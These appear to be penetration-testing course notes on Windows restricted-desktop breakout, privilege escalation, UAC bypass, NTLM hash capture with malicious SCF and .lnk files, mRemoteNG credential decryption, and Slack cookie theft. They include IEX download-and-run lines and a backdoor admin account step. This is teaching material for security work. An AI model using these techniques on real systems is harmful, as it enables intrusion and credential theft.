> With the windows dialog box open for paint, we can enter the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path `\\127.0.0.1\c$\users\pmorgan` under the File name field, with File-Type set to `All Files` and upon hitting enter we gain access to the desired directory.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F59dZFUq28DKXVzaaU5w1%2Fimage.png?alt=media&amp;token=4592080f-2666-4692-a97f-8023a3b386f0" alt=""><figcaption></figcaption></figure>

## Accessing SMB share from restricted environment

```shell-session
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
```

> Back in the Citrix environment, initiate the "Paint" application via the start menu. Proceed to navigate to the "File" menu and select "Open", thereby prompting the Dialog Box to appear. Within this Windows dialog box associated with Paint, input the UNC path as `\\10.13.38.95\share` into the designated "File name" field. Ensure that the File-Type parameter is configured to "All Files." Upon pressing the "Enter" key, entry into the share is achieved.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fr1h7z9BnYpnP6E2NXfTi%2Fimage.png?alt=media&amp;token=e7d26173-88c4-4b61-ba20-b46b84959a88" alt=""><figcaption></figcaption></figure>

> Due to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves `right-clicking` on the executables and subsequently launching them. Right-click on the `pwn.exe` binary and select `Open`, which should prompt us to run it and a cmd console will be opened.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F26QtBhYjM2bjhBGFw3Yo%2Fimage.png?alt=media&amp;token=a0e95be8-02a5-49c8-b9b7-22ce53a456c3" alt=""><figcaption></figcaption></figure>

> The executable `pwn.exe` is a custom compiled binary from `pwn.c` file which upon execution opens up the cmd.

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

> We can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FXcpUBuv3aK9LyqPKDpYB%2Fimage.png?alt=media&amp;token=75e6e11a-28d0-4549-b083-07cfdc04bfeb" alt=""><figcaption></figcaption></figure>

## Alternate Explorer

In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like `Q-Dir` or `Explorer++` can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.

It's worth noting the previous inability of File Explorer to copy files from the SMB share due to restrictions in place. However, through the utilization of `Explorer++`, the capability to copy files from the `\\10.13.38.95\share` location to the Desktop belonging to the user `pmorgan` has been successfully demonstrated in following screenshot.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FGVJL7uoUKqgCpgVkWJNm%2Fimage.png?alt=media&amp;token=186f2ebc-b277-4581-b584-ebd33437fb1e" alt=""><figcaption></figcaption></figure>

> [Explorer++](https://explorerplusplus.com/) is highly recommended and frequently used in such situations due to its speed, user-friendly interface, and portability. Being a portable application, it can be executed directly without the need for installation, making it a convenient choice for bypassing folder restrictions set by group policy.

## Alternate Registry Editors

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FyJkwFSlxWQc290NVdccI%2Fimage.png?alt=media&amp;token=740b7137-696d-46b1-a24d-6864c4f7effd" alt=""><figcaption></figcaption></figure>

> Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.

## Modify existing shortcut file

Unauthorized access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable's path in the `Target` field.

The following steps outline the process:

1. `Right-click` the desired shortcut.
2. Select `Properties`.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FMMHU06aw3pIFEhJ1gCBE%2Fimage.png?alt=media&amp;token=330022b5-c06f-4c32-8db1-0621309b6471" alt=""><figcaption></figcaption></figure>

3. Within the `Target` field, modify the path to the intended folder for access.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FUvLWVeVVyMm9XzXRbev6%2Fimage.png?alt=media&amp;token=61cee213-89a8-4707-bd61-c376301f0569" alt=""><figcaption></figcaption></figure>

4. Execute the Shortcut and cmd will be spawned

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FpLt7uSRGcu2angO8TmoE%2Fimage.png?alt=media&amp;token=86c1b81e-688c-4edc-b2ef-af8a58efd008" alt=""><figcaption></figcaption></figure>

> In cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell as mentioned under [Interacting with Users section](https://academy.hackthebox.com/module/67/section/630) under `Generating a Malicious .lnk File` tab. These approaches provide versatility in achieving our objectives while working with shortcut files.

## Script Execution

> When script extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place. This situation creates a potential security vulnerability where malicious actors could exploit these features to execute unauthorized actions on the system.
>
> 1. Create a new text file and name it "evil.bat".
> 2. Open "evil.bat" with a text editor such as Notepad.
> 3. Input the command "cmd" into the file.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FsQ1IadBsuY7kIQyjkXw8%2Fimage.png?alt=media&amp;token=5dee9519-941c-47c9-afbb-c5e97e55af7f" alt=""><figcaption></figcaption></figure>

4. Save the file.

> Upon executing the "evil.bat" file, it will initiate a Command Prompt window. This can be useful for performing various command-line operations.

## Escalating Privileges

> Once access to the command prompt is established, it's possible to search for vulnerabilities in a system more easily. For instance, tools like [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system.
>
> Using `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) key is present and set.
>
> We can also validate this using the Command Prompt by querying the corresponding registry keys:

```cmd-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```cmd-session
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

> Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.

```powershell-session
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
```

> Now we can execute `UserAdd.msi` and create a new user `backdoor:T3st@123` under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FjD4pRQ8YynLHosNWVA26%2Fimage.png?alt=media&amp;token=987255de-939f-439f-9f25-2d47f02cf7e9" alt=""><figcaption></figcaption></figure>

> Back in CMD execute `runas` to start command prompt as the newly created `backdoor` user.

```cmd-session
C:\> runas /user:backdoor cmd
```

## Bypassing UAC

> Even though the newly established user `backdoor` is a member of `Administrators` group, accessing the `C:\users\Administrator` directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.

```cmd-session
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

> Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.

```powershell-session
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FzzYynut8hoqIYK1QBUYB%2Fimage.png?alt=media&amp;token=d13ea0fd-b64b-45b0-93a8-b0797db0b431" alt=""><figcaption></figcaption></figure>

> Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command `whoami /all` or `whoami /priv`. This command provides a comprehensive view of the current user's privileges. And we can now access the Administrator directory.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F0PlvY0tXmT3uMVD1fETQ%2Fimage.png?alt=media&amp;token=345f43ab-e75a-43ca-b701-523008953480" alt=""><figcaption></figcaption></figure>

> **Additional resources worth checking:**
>
> * [Breaking out of Citrix and other Restricted Desktop environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
> * [Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)


# Additional Techniques

## 1.Interacting with Users

## Traffic Capture

If `Wireshark` is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.

![Npcap 0.9986 Setup window with installation options: Legacy loopback support, Restrict driver's access to Administrators, Support raw 802.11 traffic, and Install in WinPcap API-compatible mode. No options selected.](https://academy.hackthebox.com/storage/modules/67/pcap.png)

Here we can see a rough example of capturing cleartext FTP credentials entered by another user while signed into the same box. While not highly likely, if `Wireshark` is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up.

![Wireshark capture showing FTP traffic between IPs 10.129.43.8 and 10.129.43.7. Includes responses and requests like '220-FileZilla Server', 'USER root', and 'PASS FTP\_adm1n!'.](https://academy.hackthebox.com/storage/modules/67/ftp.png)

Also, suppose our client positions us on an attack machine within the environment. In that case, it is worth running `tcpdump` or `Wireshark` for a while to see what types of traffic are being passed over the wire and if we can see anything interesting. The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file. It is worth letting this tool run in the background during an assessment or running it against a pcap to see if we can extract any credentials useful for privilege escalation or lateral movement.

## Process Command Lines

### Monitoring for Process Command Lines

```shell-session
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

### Running Monitor Script on Target Host

```powershell-session
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

> This is successful and reveals the password for the `sqlsvc` domain user, which we could then possibly use to gain access to the SQL02 host or potentially find sensitive data such as database credentials on the `backups` share.

## Vulnerable Services

> We may also encounter situations where we land on a host running a vulnerable application that can be used to elevate privileges through user interaction. [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) is a great example of this. This was a vulnerability in Docker Desktop Community Edition before 2.1.0.1. When this particular version of Docker starts, it looks for several different files, including `docker-credential-wincred.exe`, `docker-credential-wincred.bat`, etc., which do not exist with a Docker installation. The program looks for these files in the `C:\PROGRAMDATA\DockerDesktop\version-bin\`. This directory was misconfigured to allow full write access to the `BUILTIN\Users` group, meaning that any authenticated user on the system could write a file into it (such as a malicious executable).
>
> Any executable placed in that directory would run when a) the Docker application starts and b) when a user authenticates using the command `docker login`. While a bit older, it is not outside the realm of possibility to encounter a developer's workstation running this version of Docker Desktop, hence why it is always important to thoroughly enumerate installed software. While this particular flaw wouldn't guarantee us elevated access (since it relies on a service restart or user action), we could plant our executable during a long-term assessment and periodically check if it runs and our privileges are elevated.

## SCF on a File Share

> A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.

### Malicious SCF File

> let's create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our `tun0` IP address and any fake share name and .ico file name.

```shell-session
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

### **Starting Responder**

```shell-session
sudo responder -wrf -v -I tun0
```

### Cracking NTLMv2 Hash with Hashcat

```shell-session
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

## Capturing Hashes with a Malicious .lnk File

> Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:

### Generating a Malicious .lnk File

```powershell-session
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

> Try out this technique on the target host to familiarize yourself with the methodology and add another tactic to your arsenal for when you encounter environments where Server 2019 is prevalent.

## 2.Pillaging

> Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.
>
> These data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.

### Data Sources

> Below are some of the sources from which we can obtain information from compromised systems:
>
> * Installed applications
> * Installed services
>   * Websites
>   * File Shares
>   * Databases
>   * Directory Services (such as Active Directory, Azure AD, etc.)
>   * Name Servers
>   * Deployment Services
>   * Certificate Authority
>   * Source Code Management Server
>   * Virtualization
>   * Messaging
>   * Monitoring and Logging Systems
>   * Backups
> * Sensitive Data
>   * Keylogging
>   * Screen Capture
>   * Network Traffic Capture
>   * Previous Audit reports
> * User Information
>   * History files, interesting documents (.doc/x,.xls/x,password.*/pass.*, etc)
>   * Roles and Privileges
>   * Web Browsers
>   * IM Clients
>
> This is not a complete list. Anything that can provide information about our target will be valuable. Depending on the business size, purpose, and scope, we may find different information. Knowledge and familiarity with commonly used applications, server software, and middleware are essential, as most applications store their data in various formats and locations. Special tools may be necessary to obtain, extract or read the targeted data from some systems.
>
> During the following sections, we will discuss and practice some aspects of Pillaging in Windows.

### Scenario

Let's assume that we have gained a foothold on the Windows server mentioned in the below network and start collecting as much information as possible.

![Network diagram showing connections: Pentester to Windows Server, which connects to a Router. Router links to two Switches, File Server, and Backup Servers. Switches connect to Domain Controller and Database Servers. Printer connected to Windows Server.](https://academy.hackthebox.com/storage/modules/67/network.png)

## Installed Applications

> Understanding which applications are installed on our compromised system may help us achieve our goal during a pentest. It's important to know that every pentest is different. We may encounter a lot of unknown applications on the systems we compromised. Learning and understanding how these applications connect to the business are essential to achieving our goal.
>
> We will also find typical applications such as Office, remote management systems, IM clients, etc. We can use `dir` or `ls` to check the content of `Program Files` and `Program Files (x86)` to find which applications are installed. Although there may be other apps on the computer, this is a quick way to review them.

### **Identifying Common Applications**

```cmd-session
C:\>dir "C:\Program Files"
```

> An alternative is to use PowerShell and read the Windows registry to collect more granular information about installed programs.

### **Get Installed Programs via PowerShell & Registry Keys**

```powershell-session
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

> We can see the `mRemoteNG` software is installed on the system. [mRemoteNG](https://mremoteng.org/) is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. Let's take a look at `mRemoteNG`.

## **mRemoteNG**

> `mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.
>
> By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

### **Discover mRemoteNG Configuration Files**

```powershell-session
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG
```

> Let's look at the contents of the `confCons.xml` file.

### mRemoteNG Configuration File - confCons.xml

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

> This XML document contains a root element called `Connections` with the information about the encryption used for the credentials and the attribute `Protected`, which corresponds to the master password used to encrypt the document. We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.
>
> As mentioned previously, if the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.

### **Decrypt the Password with mremoteng\_decrypt**

```shell-session
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
```

> Now let's look at an encrypted configuration file with a custom password. For this example, we set the custom password `admin`.

### mRemoteNG Configuration File - confCons.xml

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
    
<SNIP>
</Connections>
```

> If we attempt to decrypt the `Password` attribute from the node `RDP_Domain`, we will get the following error.

### Attempt to Decrypt the Password with a Custom Password

```shell-session
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
```

> If we use the custom password, we can decrypt it.

### Decrypt the Password with mremoteng\_decrypt and a Custom Password

```shell-session
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
```

> In case we want to attempt to crack the password, we can modify the script to try multiple passwords from a file, or we can create a Bash `for loop`. We can attempt to crack the `Protected` attribute or the `Password` itself. If we try to crack the `Protected` attribute once we find the correct password, the result will be `Password: ThisIsProtected`. If we try to crack the `Password` directly, the result will be `Password: <PASSWORD>`.

### For Loop to Crack the Master Password with mremoteng\_decrypt

```shell-session
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done  
```

## Abusing Cookies to Get Access to IM Clients

> With the ability to instantaneously send messages between co-workers and teams, instant messaging (IM) applications like `Slack` and `Microsoft Teams` have become staples of modern office communications. These applications help in improving collaboration between co-workers and teams. If we compromise a user account and gain access to an IM Client, we can look for information in private chats and groups.
>
> There are multiple options to gain access to an IM Client; one standard method is to use the user's credentials to get into the cloud version of the instant messaging application as the regular user would.
>
> If the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.
>
> There are often tools that may help us automate the process, but as the cloud and applications constantly evolve, we may find these applications out of date, and we still need to find a way to gather information from the IM clients. Understanding how to abuse credentials, cookies, and tokens is often helpful in accessing web applications such as IM Clients.
>
> Let's use `Slack` as an example. Multiple posts refer to how to abuse `Slack` such as [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/). We can use them to understand better how Slack tokens and cookies work, but keep in mind that `Slack's` behavior may have changed since the release of those posts.
>
> There's also a tool called [SlackExtract](https://github.com/clr2of8/SlackExtract) released in 2018, which was able to extract `Slack` messages. Their research discusses the cookie named `d`, which `Slack` uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user. Instead of using the tool, we will attempt to obtain the cookie from Firefox or a Chromium-based browser and authenticate as the user.

### **Cookie Extraction from Firefox**

> Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

### Copy Firefox Cookies Database

```powershell-session
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

> We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

### **Extract Slack Cookie from Firefox Cookies Database**

```shell-session
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

> Now that we have the cookie, we can use any browser extension to add the cookie to our browser. For this example, we will use Firefox and the extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/). Make sure to install the extension by clicking the link, selecting your browser, and adding the extension. Once the extension is installed, you will see something like this:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FhxjjCDfMEHIGXrhHrfBm%2Fimage.png?alt=media&amp;token=d4a91ca9-bf13-42fe-9937-290c229c0e98" alt=""><figcaption></figcaption></figure>

> Our target website is `slack.com`. Now that we have the cookie, we want to impersonate the user. Let's navigate to slack.com once the page loads, click on the icon for the Cookie-Editor extension, and modify the value of the `d` cookie with the value you have from the cookieextractor.py script. Make sure to click the save icon (marked in red in the image below).

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F3HeyejLP3h5hLeB7PJIu%2Fimage.png?alt=media&amp;token=d1a9d44f-74d0-4146-8a44-8192deed0786" alt=""><figcaption></figcaption></figure>

> Once you have saved the cookie, you can refresh the page and see that you are logged in as the user.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FO5hOE2ZrZJuua13jgown%2Fimage.png?alt=media&amp;token=0ee872c5-0e5b-454b-9b01-b5e91adb52ed" alt=""><figcaption></figcaption></figure>

> Now we are logged in as the user and can click on `Launch Slack`. We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie `d` with the same value we used to gain access the first time on any website that asks us for information or credentials.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F4W88M4mp0Ch8Dekg7OPr%2Fimage.png?alt=media&amp;token=58fdde71-38cc-44d7-a27e-722f595e1213" alt=""><figcaption></figcaption></figure>

> Once we complete this process for every website where we get a prompt, we need to refresh the browser, click on `Launch Slack` and use Slack in the browser.
>
> After gaining access, we can use built-in functions to search for common words like passwords, credentials, PII, or any other information relevant to our assessment.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FogTO6UEROwYOQZb4DAqb%2Fimage.png?alt=media&amp;token=69bddf18-685d-403c-8a81-79860b6075b0" alt=""><figcaption></figcaption></figure>

## Cookie Extraction from Chromium-based Browsers

> The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.
>
> To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.
>
> Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) which uses reflection to load SharpChromium.

### **PowerShell Script - Invoke-SharpChromium**

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
```

> We got an error because the cookie file path that contains the database is hardcoded in [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), and the current version of Chrome uses a different location.
>
> We can modify the code of `SharpChromium` or copy the cookie file to where SharpChromium is looking.
>
> `SharpChromium` is looking for a file in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`, but the actual file is located in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` with the following command we will copy the file to the location SharpChromium is expecting.

### **Copy Cookies to SharpChromium Expected Location**

```powershell-session
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

> We can now use Invoke-SharpChromium again to get a list of cookies in JSON format.

### **Invoke-SharpChromium Cookies Extraction**

```powershell-session
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
```

> We can now use this cookie with cookie-editor as we did with Firefox.\
> **Note:** When copy/pasting the contents of a cookie, make sure the value is one line.

## Clipboard

> In many companies, network administrators use password managers to store their credentials and copy and paste passwords into login forms. As this doesn't involve `typing` the passwords, keystroke logging is not effective in this case. The `clipboard` provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.
>
